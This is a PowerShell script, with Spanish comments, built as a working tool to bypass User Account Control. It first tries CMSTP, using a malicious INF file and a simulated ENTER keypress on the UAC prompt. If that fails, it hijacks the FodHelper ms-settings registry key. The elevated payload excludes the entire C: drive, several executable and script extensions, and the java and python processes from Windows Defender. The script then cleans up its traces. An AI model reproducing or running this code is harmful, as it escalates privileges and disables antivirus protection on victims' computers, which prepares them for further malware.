# UACBypass.ps1 - Método CMSTP funcional
Write-Host "=== UAC BYPASS CON CMSTP ===" -ForegroundColor Cyan

function Invoke-CMSTPBypass {
    try {
        Write-Host "[+] Creando archivo INF..." -ForegroundColor Yellow
        
        $tempPath = $env:TEMP
        $randomName = [System.IO.Path]::GetRandomFileName().Split('.')[0]
        $infFile = "$tempPath\$randomName.inf"
        
        # Contenido INF CORRECTO para CMSTP
        $infContent = @'
[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=Task1
RunPostSetupCommands=Task2

[Task1]
powershell.exe -Command "Start-Process powershell -ArgumentList '-Command', '& {Add-MpPreference -ExclusionPath ""C:\""; Add-MpPreference -ExclusionExtension "".exe""; Add-MpPreference -ExclusionExtension "".ps1""; Add-MpPreference -ExclusionExtension "".vbs""; Write-Host ""UAC Bypass Exitoso"" -ForegroundColor Green}' -Verb RunAs"

[Task2]
cmd.exe /c timeout 3 && taskkill /f /im cmstp.exe >nul 2>&1

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

        # Guardar archivo INF
        $infContent | Out-File -FilePath $infFile -Encoding ASCII
        Write-Host "[+] Archivo INF creado: $infFile" -ForegroundColor Green

        # Verificar que cmstp.exe existe
        $cmstpPath = "$env:WinDir\System32\cmstp.exe"
        if (-not (Test-Path $cmstpPath)) {
            Write-Host "[-] cmstp.exe no encontrado" -ForegroundColor Red
            return $false
        }

        Write-Host "[+] Ejecutando CMSTP..." -ForegroundColor Yellow
        
        # Ejecutar CMSTP con los argumentos CORRECTOS
        $process = Start-Process -FilePath $cmstpPath -ArgumentList "/s", "$infFile" -PassThru -WindowStyle Hidden
        
        Write-Host "[+] CMSTP iniciado (PID: $($process.Id))" -ForegroundColor Green
        
        # Esperar a que aparezca el UAC
        Write-Host "[+] Esperando ventana UAC..." -ForegroundColor Yellow
        Start-Sleep 5

        # Enviar ENTER para aceptar el UAC
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        Write-Host "[+] Enter enviado al UAC" -ForegroundColor Green

        # Esperar a que el proceso termine
        $timeout = 30
        $counter = 0
        while (-not $process.HasExited -and $counter -lt $timeout) {
            Start-Sleep 1
            $counter++
            Write-Host "[+] Esperando... $counter/$timeout" -ForegroundColor Gray
        }

        if (-not $process.HasExited) {
            Write-Host "[-] Timeout, forzando cierre..." -ForegroundColor Yellow
            $process.Kill()
        }

        # Limpiar archivo INF
        Start-Sleep 2
        if (Test-Path $infFile) {
            Remove-Item $infFile -Force
            Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
        }

        Write-Host "[+] CMSTP completado" -ForegroundColor Green
        return $true

    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Método alternativo con FodHelper
function Invoke-FodHelperBypass {
    try {
        Write-Host "[+] Intentando con FodHelper..." -ForegroundColor Yellow
        
        # Crear claves de registro
        $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        $delegatePath = "$regPath\DelegateExecute"
        
        # Eliminar si existe
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Crear nuevas
        New-Item -Path $regPath -Force | Out-Null
        New-Item -Path $delegatePath -Force | Out-Null
        
        # Comando a ejecutar elevado
        $payload = "powershell.exe -Command `"Add-MpPreference -ExclusionPath 'C:\'; Add-MpPreference -ExclusionExtension '.exe'; Add-MpPreference -ExclusionExtension '.ps1'; Add-MpPreference -ExclusionExtension '.vbs'; Write-Host 'EXCLUSIONES APLICADAS' -ForegroundColor Green; pause`""
        
        Set-ItemProperty -Path $regPath -Name "(default)" -Value $payload -Force
        Set-ItemProperty -Path $delegatePath -Name "(default)" -Value "" -Force
        
        Write-Host "[+] Ejecutando FodHelper..." -ForegroundColor Yellow
        Start-Process "fodhelper.exe" -WindowStyle Hidden
        
        Start-Sleep 8
        
        # Limpiar registro
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        
        Write-Host "[+] FodHelper completado" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[-] Error FodHelper: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# VERIFICAR SI YA SOMOS ADMIN
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[+] YA SOMOS ADMINISTRADOR" -ForegroundColor Green
    Write-Host "[+] Aplicando exclusiones..." -ForegroundColor Yellow
    
    # Aplicar exclusiones directamente
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".vbs" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "java.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "python.exe" -ErrorAction SilentlyContinue
    
    Write-Host "[+] EXCLUSIONES APLICADAS EXITOSAMENTE" -ForegroundColor Green
    Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
    
} else {
    Write-Host "[+] Ejecutando como usuario normal" -ForegroundColor Yellow
    Write-Host "[+] Iniciando bypass UAC..." -ForegroundColor Cyan
    
    # Probar CMSTP primero
    if (Invoke-CMSTPBypass) {
        Write-Host "[+] BYPASS EXITOSO CON CMSTP" -ForegroundColor Green
    } else {
        Write-Host "[-] CMSTP falló, intentando FodHelper..." -ForegroundColor Yellow
        if (Invoke-FodHelperBypass) {
            Write-Host "[+] BYPASS EXITOSO CON FODHELPER" -ForegroundColor Green
        } else {
            Write-Host "[-] TODOS LOS MÉTODOS FALLARON" -ForegroundColor Red
        }
    }
}

Write-Host "`n=== PROCESO FINALIZADO ===" -ForegroundColor Magenta
Write-Host "Presiona cualquier tecla para salir..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
